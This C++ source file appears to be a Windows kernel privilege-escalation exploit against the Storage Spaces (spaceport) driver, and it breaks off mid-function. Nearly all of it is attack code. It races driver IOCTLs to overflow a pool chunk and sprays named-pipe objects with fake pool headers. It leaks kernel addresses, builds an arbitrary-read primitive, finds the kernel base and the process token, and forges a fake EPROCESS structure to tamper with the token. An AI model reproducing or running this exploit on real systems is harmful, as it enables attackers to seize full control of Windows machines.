#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <iostream>
#include <TlHelp32.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef VOID(NTAPI *PIO_APC_ROUTINE)(
	_In_ PVOID ApcContext,
	_In_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG Reserved
	);
#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


typedef NTSTATUS(WINAPI* PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);
#define MAXIMUM_FILENAME_LENGTH 255 


typedef struct _SYSTEM_HANDLE
{
	DWORD ProcessId;
	//  USHORT  CreatorBackTraceIndex;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount; /* Or NumberOfHandles if you prefer. */
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);
typedef NTSTATUS(WINAPI* pNtFsControlFile) (HANDLE handle, HANDLE event, PIO_APC_ROUTINE apc, PVOID apc_context, PIO_STATUS_BLOCK io, ULONG code, PVOID in_buffer, ULONG in_size, PVOID out_buffer, ULONG out_size);
struct threadit
{
	DWORD checkpass;
	HANDLE handlier;
};

struct later
{
	DWORD checkid;
};
DWORD WINAPI setthread1(HANDLE handle);
DWORD WINAPI getthread2(HANDLE handle);
DWORD WINAPI run(HANDLE handle);
DWORD WINAPI async(HANDLE handle);
DWORD WINAPI runit(HANDLE handle);
DWORD WINAPI testers(HANDLE handle);
DWORD WINAPI setit(threadit);
DWORD getid(HANDLE handle);
DWORD sprayer();
int closepipe(pipehandles_t* pipeh);
void create();
void holer(pipeinfo_t* pipei);
pipeinfo_t * pipecreate(DWORD sizeofchunk, DWORD sizeofbuf, char * data);
int writepipe(pipehandles_t *pipeh);
int spray(pipeinfo_t *pipei);
DWORD createpipe(DWORD size, pipehandles_t *pipeh);
int set_attribute(pipehandles* pipeh, char* data, DWORD size);
int spraywritepipe(pipein_t *pipeh);
void initFakeEprocess(PVOID addr, DWORD64 addr_to_decrement);
void initFakeEprocess1(PVOID addr, DWORD64 addr_to_decrement);
void npp_alloc_fake_eprocess(char *fake_process, char * fake_eprocess_buf, int g_index);
uintptr_t findcurrenteprocess();
void shell();
#define NAME_TAG "NAME1"
#define NAME_TAG_LEN  sizeof(NAME_TAG)
HANDLE free1 = 0;
#define NAME_TAG2 "NAME2"
#define NAME_TAG2_LEN  sizeof(NAME_TAG2)
pipein_t * spraynew();
DWORD closep(pipeinfo_t *pipein);
pipein_t * spraynew();
OVERLAPPED overlap2 = { 0 };
void newspray();
void enablelookaside();
void resp();
HANDLE handle1 = 0;
HANDLE handle2 = 0;
HANDLE handle3 = 0;
HANDLE handle4 = 0;
HANDLE write_pipe[0x10000] = { 0 };
HANDLE read_pipe[0x10000] = { 0 };
HANDLE write[0x5000];
HANDLE read[0x5000];
HANDLE *write1;
HANDLE write2[0x20000] = { 0 };
HANDLE read2[0x20000] = { 0 };
HANDLE *read3;
HANDLE *write3;
DWORD output[0x5000] = { 0 };
HANDLE *read1;
uintptr_t root_attribute;
HANDLE *rewrite_r;
HANDLE *rewrite_w;

HANDLE *finale_r ;
HANDLE *finale_w ;

HANDLE finale_r1[0x5000] = { 0 };
HANDLE finale_w1[0x5000] = { 0 };

HANDLE gost_r[0x1000] = { 0 };
HANDLE gost_w[0x1000] = { 0 };

HANDLE robin_r[0x1000] = { 0 };
HANDLE robin_w[0x1000] = { 0 };
OVERLAPPED overlap3 = { 0 };
DWORD readattribute();
DWORD writeattribute();
void attributer();
pNtFsControlFile NtFsControlFile = (pNtFsControlFile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtFsControlFile");
uintptr_t fake_eprocess;
char attribute[100] = { 0 };
//memset(attribute, 0x56, 0x10);
char outputer[0x100];
DWORD bufsize = 0x160;
IO_STATUS_BLOCK status = { 0 };
DWORD buf[0x100] = { 0x2323232323 };
DWORD res = 0;
DWORD fakebuffer1[0x30] = { 0 };
DWORD fakebuffer2[0x10] = { 0 };

DWORD checkout1[0x20000] = { 0 };
DWORD checkout[0x2000];

HANDLE checkmate[0x10000] = { 0 };

size_t current_pipe_offset;
pipe_queue_entry_sub_t* fake_pipe_queue_entry;
pipequeueentry_t * pipe_queue_entry;
void arbitread(char *out, size_t size, uintptr_t where, DWORD index);
uintptr_t self_eprocess;
size_t winlogon_pid;
uintptr_t self_token;
int main()
{
	threadit thread;
	//

	
	*write      = (HANDLE*)malloc(0x10000 * 50    * sizeof(HANDLE));
	write1      = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	*write2     = (HANDLE*)malloc(0x10000 * 0x100 * sizeof(HANDLE));
	write3      = (HANDLE*)malloc(0x10000 * 10    * sizeof(HANDLE));
	*read       = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	read1       = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	*read2      = (HANDLE*)malloc(0x10000 * 0x100 * sizeof(HANDLE));
	read3       = (HANDLE*)malloc(0x10000 * 10    * sizeof(HANDLE));
	*read_pipe  = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	*write_pipe = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	rewrite_r   = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	rewrite_w   = (HANDLE*)malloc(0x10000 * 4     * sizeof(HANDLE));
	finale_w    = (HANDLE*)malloc(0x10000 * 10    * sizeof(HANDLE));
	finale_r    = (HANDLE*)malloc(0x10000 * 10    * sizeof(HANDLE));
	
	
	
	const GUID GUID_DEVINTERFACE_MODEM = { 0x2c7089aa, 0x2e0e, 0x11d1,{ 0xb1, 0x14, 0x00, 0xc0, 0x4f, 0xc2, 0xaa, 0xe4 } };
	printf("[+] Starting exploit \n");

	printf("[+] Opening handke to \\.\Device\Spaceport \n");
	HANDLE handle = CreateFileA("\\\\.\\spaceport",
		GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);

	if (handle == NULL) {
		printf("[-] Failed to open \\Device\\Spaceport: %u\n", GetLastError());
		return 1;
	}
	printf("[+] Handle opened to the device : 0x%x\n", handle);
	
	DWORD a[100] = { 0x2c7089aa, 0x2e0e, 0x11d1 };

	
	ULONG_PTR OutputBuffer[0x10000] = { 0 };
	DWORD BytesReturned;

	DWORD tid = 0;
	DWORD tid1 = 0;
	//HANDLE geth= CreateThread(NULL, 0, getthread2, handle, 0, &tid);// 
	printf("[+] Finished running the getthread!\n");

	//HANDLE seth= CreateThread(NULL, 0, run, handle, 0, &tid1);//
	printf("[+] Finished running the run thread!\n");
	//CreateThread(NULL, 0, getthread2, handle, 0, &tid);
	
	OVERLAPPED overlap = { 0 };
	
	
	
	handle1 = CreateThread(NULL, 0, testers, handle, 0, &tid);
	
	if (WaitForSingleObject(handle1, INFINITE) == WAIT_OBJECT_0)
	{
		printf("[+] Testers thread completed!\n");
	}
	return 0;
}
DWORD WINAPI setthread1(HANDLE handle)
{
	DWORD IoctlData[0x1000] = { 0 };
	
	memset(IoctlData, 0x41, 0x4);
	memset(IoctlData + 4, 0x42, 0x4);
	memset(IoctlData + 8, 0x43, 0x4);
	ULONG_PTR OutputBuffer[0x10000] = { 0 };
	DWORD BytesReturned;
	while (1)
	{

		BOOL Status = DeviceIoControl(
			handle,
			0xE7D810,
			IoctlData,
			0x100,
			&OutputBuffer,
			0x10000,
			&BytesReturned,
			NULL
		);
	}
}
DWORD WINAPI getthread2(HANDLE handle)
{
	DWORD input = 0;
	DWORD output = 0;
	LPDWORD byte = 0;
	DWORD tid1 = 0;
	OVERLAPPED overlap = { 0 };
	//HANDLE thread = CreateThread(NULL, 0, run, handle, 0, &tid1);
	HANDLE eventobj = CreateEvent(NULL, FALSE, FALSE, NULL);
	overlap.hEvent = eventobj;
	overlap.Internal = 0;
	overlap.InternalHigh = 0;
	overlap.Offset = 0;
	overlap.OffsetHigh = 0;
	overlap.Pointer = 0;

	BOOL Status = DeviceIoControl(
		handle,
		0xe7180c,
		&input,
		0x100,
		&output,
		0x100,
		byte,
		&overlap
	);

	if (GetLastError() == ERROR_IO_PENDING)
	{
		printf("[!] Io is pending still\n");
		//system("pause");
	}
	printf("[+] Executed GetCoontrolWork() to empty the list and queue the irp!\n");
	DWORD IoctlData[0x1000] = { 0 };
	
	DWORD tid = 0;
	memset(IoctlData, 0x41, 0x4);
	memset(IoctlData + 4, 0x42, 0x4);
	memset(IoctlData + 8, 0x43, 0x4);
	ULONG_PTR OutputBuffer[0x10000] = { 0 };
	DWORD BytesReturned;
	HANDLE seth = CreateThread(NULL, 0, run, handle, 0, &tid);
	while (1)
	{

		BOOL Status = DeviceIoControl(
			handle,
			0xE7D810,
			&output,
			0x100,
			&OutputBuffer,
			0x10000,
			&BytesReturned,
			NULL
		);
	}
}

DWORD WINAPI run(HANDLE handle)
{

	DWORD input[0x100] = { 0 };
	DWORD output[0x100] = { 0 };
	LPDWORD byte = 0;

	while (1)
	{
		DeviceIoControl(
			handle,
			0xe7c848,
			input,
			0x100,
			&output,
			0x100,
			byte,
			NULL
		);
	}
	return (DWORD)byte;
}


DWORD WINAPI async(HANDLE handle)
{
	/*

	SpIoctlGetControlWork() will run asynchronously and if the the return status is IO_PENDING ,
	then we will execute the SpIoctlSpaceAttachRemote->SP_COMTROL_WORK::Run() to dequeue the irp and
	get the he ID. After we get the ID we can can call SpIoctlGetControlWork(List) to execute the memmove
	for the overflow.

	*/
	

	DWORD input[0x100] = { 0 };
	DWORD output[0x100] = { 0 };
	LPDWORD byte = 0;
	DWORD tid1 = 0;
	OVERLAPPED overlap = { 0 };
	//HANDLE thread = CreateThread(NULL, 0, run, handle, 0, &tid1);
	HANDLE eventobj = CreateEvent(NULL, FALSE, FALSE, NULL);
	overlap.hEvent = NULL;
	overlap.Internal = 0;
	overlap.InternalHigh = 0;
	overlap.Offset = 0;
	overlap.OffsetHigh = 0;
	overlap.Pointer = 0;

	while (1)
	{
		BOOL Status = DeviceIoControl(
			handle,
			0xe7180c,
			&input,
			0x100,
			&output,
			0x100,
			byte,
			&overlap
		);
		DWORD b = 0;
		DWORD tid = 0;
		DWORD IoctlData[0x1000] = { 0 };
		memset(IoctlData, 0x41, 0x4);
		memset(IoctlData + 4, 0x42, 0x4);
		memset(IoctlData + 8, 0x43, 0x1000);
		ULONG_PTR OutputBuffer[0x10000] = { 0 };
		DWORD BytesReturned;

		if (GetLastError() == ERROR_IO_PENDING)
		{
			
			//GetOverlappedResult(handle, &overlap, &b, TRUE);
			//DeviceIoControl(handle, 0xE7C810, IoctlData, 0x669, OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);
			CreateThread(NULL, 0, run, handle, 0, &tid);

		}

		else
		{

			DeviceIoControl(handle, 0xE7C810, output, 0x991, OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);
			break;
		}
	}
	return -1;
}
DWORD WINAPI testers(HANDLE handle)
{
	
	DWORD input[0x1000] = { 0 };
	DWORD output[0x1000] = { 0 };
	LPDWORD byte = 0;
	
	DWORD t = 0;
	int i = 0;
	OVERLAPPED overlap = { 0 };
	overlap.hEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
	overlap.Internal = 0;
	overlap.InternalHigh = 0;
	overlap.Offset = 0;
	overlap.OffsetHigh = 0;
	overlap.Pointer = 0;

	
	

	DWORD bu[0x20] = { 0 };
	memset(bu, 0x20, 0x41);
	DWORD outing1 = 0;
	

	BOOL stat = DeviceIoControl(handle, 0xE7180c, input, 0x100, output, 0x100, byte, &overlap);
	if (GetLastError() == ERROR_IO_PENDING)
	{
		
		//setits(handle);

		handle2 = CreateThread(NULL, 0, runit, handle, 0, &t);
		i++;
	}

	

	//DWORD outputbuf[0x100] = { 0 };
	DWORD tid4 = 0;
	static threadit thread;
	//threadit *thread = (threadit *)malloc(sizeof(thread));
	thread.checkpass = output[3];
	thread.handlier = handle;
	DWORD num = 1;
	HANDLE threads[400] = { 0 };
	int c = 0;
	DWORD a[0x1000] = { 0 };


	HANDLE threadER = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&setit, &thread, 0, &tid4);

	DWORD waiter = WaitForSingleObject(overlap3.hEvent, INFINITE);
	if (waiter == WAIT_OBJECT_0)
	{
		printf("Result for WaitForSingleObject 3 : %d\n", waiter);
		TerminateThread(handle2, 0);
		return 1;
	}
	DWORD wait = WaitForSingleObject(threadER, INFINITE);


	DWORD wait2 = WaitForSingleObject(overlap2.hEvent, INFINITE);
	if (wait == WAIT_OBJECT_0)
	{
		CloseHandle(overlap2.hEvent);
		return 1;
	}
	TerminateThread(handle2, 0);

			//printf("%d\n", i);
			//printf("GetLastError: %d\n", GetLastError());
			//DWORD a = GetThreadPriority(thread.handlier);
			//printf("Priority lebel :%d", a);
			//SetThreadPriority(thread.handlier, 4);

	printf("[!] Terminated the thread!");
	TerminateThread(thread.handlier, 0);
	ExitThread(0);

	//DWORD wait = WaitForMultipleObjects(0x1000, threads, TRUE, INFINITE);
	//if (wait == WAIT_FAILED)
	//{
	printf("[!] Thread wait failed!\n");
	printf("[+] the thread has completed running!\n");


	printf("[+] Calling SpioctlControlWork again\n");
	

	printf("yay!\n");

	DWORD tid3 = 0;
	//CreateThread(NULL, 0, setit, handle, 0, &tid3);
	printf("[+]Number of bytes returned after call :%d\n", byte);
	//setits(handle);


	//CreateThread(NULL, 0, setit, handle, 0, &tid3);
	for (int i = 0; i <= 0x4; i++)
	{
		printf("%#x\n", output[i]);
	}
	//CloseHandle(handle);
	printf("");
	return 0;
}
DWORD WINAPI runit(HANDLE handle)
{

	DWORD input[0x1000] = { 0 };

	DWORD output[0x1000] = { 0 };
	LPDWORD byte = 0;

	overlap3.hEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
	overlap3.Internal = 0;
	overlap3.InternalHigh = 0;
	overlap3.Offset = 0;
	overlap3.OffsetHigh = 0;
	overlap3.Pointer = 0;
	printf("[!]Calling SpIoctlAttachSpaceRemote !\n");

	DeviceIoControl(handle, 0xE7c848, input, 0x100, output, 0x100, byte, &overlap3);

	return 1;
}
void setits(threadit *thread)
{

	LPDWORD byteit = 0;
	OVERLAPPED overlap2 = { 0 };
	overlap2.hEvent = NULL;
	overlap2.Internal = 0;
	overlap2.InternalHigh = 0;
	overlap2.Offset = 0;
	overlap2.OffsetHigh = 0;
	overlap2.Pointer = 0;
	//DWORD input[0x100] = { 0 };g

	DWORD outputbuf[0x100] = { 0 };
	DWORD output[0x1000] = { 0 };
	RtlZeroMemory(output, 0x1000);
	memset(output + 8, 0x5, 0x4);
	//memset(output +4, 0x41, 0x100);
	printf("[!] Hit!!!!!!!!\n");
	//DeviceIoControl(handle, 0xE7D810, output, 0x287, &outputbuf, 0x100, byteit, &overlap2);
	RtlZeroMemory(output, 0x1000);
}
DWORD WINAPI setit(threadit thread)
{

	LPDWORD byteit = 0;
	overlap2.hEvent =  CreateEvent(NULL, FALSE, FALSE, NULL);
	overlap2.Internal = 0;
	overlap2.InternalHigh = 0; 
	overlap2.Offset = 0;
	overlap2.OffsetHigh = 0;
	overlap2.Pointer = 0;
	//DWORD input[0x100] = { 0 };g
	int c = 0;
	DWORD iid = 0;
	DWORD a = 0;
	DWORD outputbuf[0x100] = { 0 };
	DWORD check = thread.checkpass; 
	
	DWORD output[0x1000] = { 0x8384,0,0x1 };//output[2] has to be increased by one every time you run the program

	
	unsigned long long at = 0x190; 
	//memset(output + 4, 0x53, 0x100);
	memset(output + 0x15, 0, 4);          // offset to the source buffer
	memset(output + 0x16, 0, 8);
	//memset(output + 0x17, 0x2, 0x2);   //  Offset to  the size of the vulnerable chunk i.e controllable size
	memset(output + 0x18, 0, 0x6);
	
	
	output[0x40] = 0x0400000f; // POOL_HEADER
	
	output[0x17] = 0x104;      // size of the vulnerable chunk
	
	char *rewrite_buffer;
	rewrite_buffer = (char*)malloc(0x200);
	memset(rewrite_buffer, 0x65, 0x40);

	rewrite_buffer[0x41] = 0x0;
	rewrite_buffer[0x42] = 0x25;
	rewrite_buffer[0x43] = 0x00;
	rewrite_buffer[0x44] = 0x00;

	DWORD fakebuffer[0x14];
	//DWORD *fakebuffer;
	//fakebuffer = (DWORD*)malloc(0x1000);
	memset(fakebuffer, 0x99, sizeof(fakebuffer)-0xc);
	fakebuffer[0x10] = 0x00250000;
	//fakebuffer[0x11] = 0x00250000;
	 
	//fakebuffer[0x70] = 0x00200000;
	DWORD newd1 = 0;


	DWORD newde = 0;

	DWORD neud = 0;
	int i = 0;


	int checkread = 0;

	DWORD reader[0x1000] = { 0 };
	UCHAR buffer[0x170] = { 0 };
	memset(buffer, 0x41, 0x100);
	DWORD len = 0;

	DWORD newd = 0;
	
	int count = 0;
	DWORD readerit = 0;
	DWORD readerit1 = 0;

	memset(fakebuffer1, 0x49, 0x2);
	memset(fakebuffer2, 0x43, 0x2);


	DWORD checkbuf[0x20];
	memset(checkbuf, 0x69, 0x10);


	HANDLE bang[0x200] = { 0 };
	HANDLE checkmate1[0x500] = { 0 };



	LPVOID outing[0x1000] = { 0 };
	DWORD outingcount = 0;
	DWORD outingreadb = 0;
	DWORD outing1 = 0;
	DWORD outing2 = 0;
	BOOL b = 0;
	int counterstrike = 0;
	DWORD bu[0x10] = { 0 };
	memset(bu, 0x44, 0x1);
	
	for (int i = 0; i < 101; i++)
	{
		CreatePipe(&read[i], &write[i], NULL, 0x170);
	}

	for (int i = 0; i < 101; i++)
	{
		
		WriteFile(write[i], bu, 0x170 - 0x40, &newd1, NULL);
		
	}
	
	
	while (1)
	{

		b = DeviceIoControl(thread.handlier, 0xE7D810, output, 0x170, &outputbuf, 0x300, byteit, &overlap2);



		if (b == 1)
		{

			++counterstrike;

			
			printf("[+] SpIoctlSetCurrentIoctl success and signaled event\n");
			printf("[+] Freeing the pool by exiting thread!\n");
			CloseHandle(thread.handlier);

			WORD buf[0x100];
			DWORD r = 0;


			printf("[+] Respraying the pool with pipe  objects with fake pool header!\n");


			
			int f = 0;
			for (int i = 0; i < 500; i++)
			{
				CreatePipe(&read1[i], &write1[i], NULL, 0x170);
			}

			for (int i = 0; i < 500; i++)
			{
				
				WriteFile(write1[i], fakebuffer, 0x170 - 0x40, &newd1, NULL);
				
			}

			//resp();// respray with pipe attribute objects  with fake header at an offset 0x70 from base address.
			printf("[+] Enabling lookaside list!\n");
			for (int i = 0; i <= 0x5000; i++)
			{
				CreatePipe(&read2[i], &write2[i], NULL, 0x1000 - 0x40);
			}

			for (int i = 0; i <= 0x5000; i++)
			{
				WriteFile(write2[i], &fakebuffer1, 0x250 - 0x40, &newde, NULL);
			}
	
			Sleep(2000);
			for (int i = 0; i <= 0x3000; i++)
			{
				CreatePipe(&read2[i], &write2[i], NULL, 0x1000 - 0x40);
			}

			for (int i = 0; i <= 0x3000; i++)
			{
				WriteFile(write2[i], &fakebuffer1, 0x250 - 0x40, &newde, NULL);
			}
			

			Sleep(1000);

			printf("[+] Freeing the originally sprayed objects and triggering cache alignment !\n");
			

			for (int i = 0; i < 101; i++)
			{
				CloseHandle(write[i]);
				CloseHandle(read[i]);
			}


			printf("[+] Allocating ghost chunk !\n");
			
			for (int i = 0; i < 400; i++)
			{
				CreatePipe(&read3[i], &write3[i], NULL, 0x250 - 0x40);
			}

			for (int i = 0; i < 400; i++)
			{
				checkbuf[11] = i + 1;
				WriteFile(write3[i], checkbuf, 0x250 - 0x40, &newde, NULL);
				
			}
		
			
			printf("[+] Leaking contents of the allocted host chunk\n");

			RtlZeroMemory(checkout, sizeof(checkout));
				
			
			DWORD checkbuf1[0x500] = { 0 };
			
		
			DWORD checkbuf2[0x500] = { 0 };
			RtlZeroMemory(checkbuf2, sizeof(checkbuf2));
			DWORD checkread1 = 0;
			DWORD64 rootqueue[0x1000] = { 0 };
			printf("[+] Reading the resprayed pipes !\n");
			
			int g_index = 0;
			DWORD64 checkouter[0x500];
			ReadFile(read1[10], &checkbuf1, 0x150, (LPDWORD)checkread, NULL);
			int counter = 0;
			for (int j = 0; j < 100; i++)
			{
				
				RtlZeroMemory(checkout, 0x140);
				ReadFile(read1[j], &checkout, 0x150, (LPDWORD)checkread1, NULL);
				if (RtlCompareMemory(checkbuf1, checkout, 0x130)!=0x130)
				{
					printf("[+] Handle : 0x%x , pipe no.: %d\n", read1[j], j);
					free1 = read1[j];
					g_index = checkout[0x2b];
				
					for (int k = 0; k <= 0x150; k++)
					{
						
						if (((checkout[k] & 0xFFFF0000) == 0xFFFF0000) || ((checkout[k] & 0xFFFFF000) == 0xFFFFF000))
						{
							/
							rootqueue[counter] = ((checkout[k] * 0x100000000) + checkout[k - 1]);
							//printf("[+] Leaked Root Queue Entry   : 0x%llx\n", rootqueue[counter]);
							//printf("[+] Leaked Paged pool address : 0x%x%x\n", checkout[k],checkout[k-1]);

							++counter;
						}
						//}

					}
					break;

				}
				

			}
			
			if (g_index==0)
			{
				return 1;
			}
			
			g_index = g_index - 1;
			printf("[+] Ghost chunk offset %x\n", g_index);
			for (int i = 0; i < 2; i++)
			{

				printf("[+]Leaked address : 0x%llx\n", rootqueue[i]);
			}



			 fake_pipe_queue_entry = (pipe_queue_entry_sub_t*)malloc(sizeof(pipe_queue_entry_sub_t));
			memset(fake_pipe_queue_entry, 0, sizeof(pipe_queue_entry_sub_t));



			
			pipe_queue_entry = (pipequeueentry_t*)((char*)rewrite_buffer + 0x50);

			pipe_queue_entry->list.Flink      =   (LIST_ENTRY *)rootqueue[0];
			pipe_queue_entry->list.Blink      =   (LIST_ENTRY *)rootqueue[0];
			pipe_queue_entry->field_10        =   (UINT64)fake_pipe_queue_entry;
			pipe_queue_entry->security		  =   0; 
			pipe_queue_entry->field_20        =   0x1;
			pipe_queue_entry->DataSize        =   0xffffffff;
			pipe_queue_entry->remaining_bytes =   0xffffffff;
			pipe_queue_entry->field_2C        =   0x48484848;

			printf("[+] Created a fake pipe_query_entry to forge IRP in ghost chunk and freeing the vuln chunk!\n");
			uintptr_t root_queue = (uintptr_t)rootqueue[0];

			printf("[+] Root_queue is %llX\n", root_queue);
			for (int i = 0; i < 500; i++)
			{
				CloseHandle(write1[i]);
				CloseHandle(read1[i]);
			}
			free(read1);
			free(write1);
			write1 = NULL;
			read1 = NULL;
			//CloseHandle(free);
			//free(fakebuffer);
			RtlZeroMemory(fakebuffer, sizeof(fakebuffer));
			printf("[+] Freed the vulnerable chunk with handle %x!\n", free1);

			printf("[+] Spraying more chunks to rewrite the ghost chunk pipe_queue_entry structure\n");
			for (int i = 0; i <= 500; i++)
			{
				CreatePipe(&rewrite_r[i], &rewrite_w[i], NULL, 0x170 - 0x40);
			}

			for (int i = 0; i <= 500; i++)
			{
				WriteFile(rewrite_w[i], rewrite_buffer, 0x170 - 0x40, &newde, NULL);
			}

			
			uintptr_t ghostaddress;
			uintptr_t ghostaddress1;
			DWORD64 reader3[0x10000];
			DWORD nread3 = 0;
			 root_attribute = rootqueue[0] - 0x48 + 0x140;
			uintptr_t file_object_ptr =rootqueue[0] - 0x18;
			printf("[+] File object pointer is at :0x%llX\n", file_object_ptr);
			//fake_pipe_queue_entry->data_ptr = file_object_ptr;
			uintptr_t file_object_ptr_real;
			arbitread((char*)&file_object_ptr_real, 0x8, file_object_ptr,g_index);
			uintptr_t temp;
			
			printf("[+] File Object ptr real  : %llX\n", file_object_ptr_real);
			
			arbitread((char*)&ghostaddress, 0x8, rootqueue[0], g_index);
			ghostaddress = ghostaddress - 0x10;
			printf("[+] Ghost chunk address: 0x%llx \n", ghostaddress);
			system("pause");
			
			ghostaddress1 = ghostaddress;
			
			DWORD nread1 = 0;
			uintptr_t copy1;
			
			DWORD64 reader1[0x100];
			arbitread((char*)&copy1, 0x8, file_object_ptr_real+8, g_index);
			
			printf("[+] DeviceObject is at : %llx\n", copy1);
			//RtlZeroMemory(reader3, sizeof(reader3));
			
			uintptr_t copy2;
			DWORD nread2 = 0;
			arbitread((char*)&copy2, 0x8, copy1+0x8, g_index);
		
			printf("[+] DriverObject is at : %llx\n", copy2);
			
			
			uintptr_t copy3;
			DWORD nread10 = 0;
			
			arbitread((char*)&copy3, 0x8, copy2+0x70, g_index);
			printf("[+]Npfs!FsdCreate is at : %llx\n", copy3);
			RtlZeroMemory(reader3, sizeof(reader3));
			//system("pause");
			uintptr_t copy4;
			DWORD nread4 = 0;
			
			arbitread((char*)&copy4, 0x8, copy3-0xB670+0x7050, g_index);
			printf("[+]nt!ExAllocatePoolWithTag is at : %llx\n", copy4);
			//RtlZeroMemory(reader3, sizeof(reader3));
			
			
			
			printf("[+]NtosKrnl base is at : %llx\n", (copy4 - 0x36f010));
			uintptr_t kernellbase = copy4 - 0x36f010;
		
			uintptr_t copy6;
			DWORD nread6 = 0;
			
			arbitread((char*)&copy6, 0x8, kernellbase+0x5748c8, g_index);
			printf("[+]Ent!ExpPollQuotaCookie is : %llx\n", copy6);
			
			self_eprocess=findcurrenteprocess();
			printf("[+] Self_eprocess is at : %llx\n",self_eprocess);
			
			arbitread((char *)&self_token,0x8,self_eprocess + 0x360, g_index);
			// The pointer is encoded
			self_token = self_token & (~0xF);
			printf("[+] self_token is : 0x%llx\n", self_token);
			printf("[+] Creating Fake _EPROCESS struct\n");


			char fake_eprocess_attribute_buf[0x20000] ;
			char fake_eprocess_buf[0x10000]  ;

			char fake_eprocess_buf1[0x10000];
			memset(fake_eprocess_buf1, 0x41, sizeof(fake_eprocess_buf1));
			strcpy_s(fake_eprocess_attribute_buf, NAME_TAG2);

			
			initFakeEprocess(fake_eprocess_buf, (DWORD64)self_token + 0x48);
			memcpy(fake_eprocess_attribute_buf + NAME_TAG2_LEN, fake_eprocess_buf, 0x540);
			initFakeEprocess1(fake_eprocess_buf1, (DWORD64)self_token + 0x40);
			memcpy(fake_eprocess_attribute_buf + NAME_TAG2_LEN + 0x540, fake_eprocess_buf1, 0x8e0);//8e0
			npp_alloc_fake_eprocess((char *)&fake_eprocess, fake_eprocess_attribute_buf, g_index);
			printf("[!]CHECK NOW!!\n");
			

			printf("[+] fake_eprocess is : 0x%llx\n", fake_eprocess+0x50);
			
			

			char *finale;
			
			finale = (char*)malloc(0x1000);
			*((unsigned char*)finale + 0x40 )= 0x0;
			*((unsigned char*)finale + 0x41) = 0x0;
			*((unsigned char*)finale + 0x42) = 0x25;
			*((unsigned char*)finale + 0x43) = 0x8;
			*(uint32_t*)((unsigned char*)finale  + 0x44)  = 0x55545452;
			*(uintptr_t*)((unsigned char*)finale + 0x48) = (((DWORD64)(fake_eprocess+0x50) ^ (DWORD64)copy6) ^ (DWORD64)ghostaddress);

			RtlZeroMemory(pipe_queue_entry, sizeof(pipe_queue_entry));

			
			printf("[+] First ProcessBilled  : 0x%llx\n", (((DWORD64)(fake_eprocess + 0x50) ^ (DWORD64)copy6) ^ (DWORD64)ghostaddress));
			printf("[+] Current pipe offset  : %d\n", current_pipe_offset);
			*(uintptr_t *)((unsigned char *)(finale + 0x50))= root_queue;
			*(uintptr_t *)((unsigned char *)(finale + 0x58)) = root_queue;
			*(uintptr_t *)((unsigned char *)finale + 0x60) = (uintptr_t)0;
			*(uintptr_t *)((unsigned char *)finale + 0x68) = (uintptr_t)0;
			*(uintptr_t *)((unsigned char *)finale + 0x70) = 0;
			*(unsigned long *)((unsigned char *)finale + 0x78) = (unsigned long)current_pipe_offset;
			*(unsigned long *)((unsigned char *)finale + 0x7c) = (unsigned long)0;
			printf("[+]Freeing the resprayed pipes for rewriting!\n");

			ghostaddress = NULL;
			for (int i = 0; i <= 500; i++)
			{
				CloseHandle(rewrite_w[i]);		
				CloseHandle(rewrite_r[i]);
			}
			free(rewrite_w);
			free(rewrite_r);
			free(rewrite_buffer);
			rewrite_w = NULL;
			rewrite_r = NULL;
			
			
			
			printf("[+] Spraying pipes for final write!\n");
			printf("[!] First check : Final spray works or not!\n");
			for (int i = 0; i <= 400; i++)
			{
				CreatePipe(&finale_r[i], &finale_w[i], NULL, 0x170 - 0x40);
			}

			for (int i = 0; i <= 400; i++)
			{
				WriteFile(finale_w[i], finale, 0x170 - 0x40, &newde, NULL);
			} 
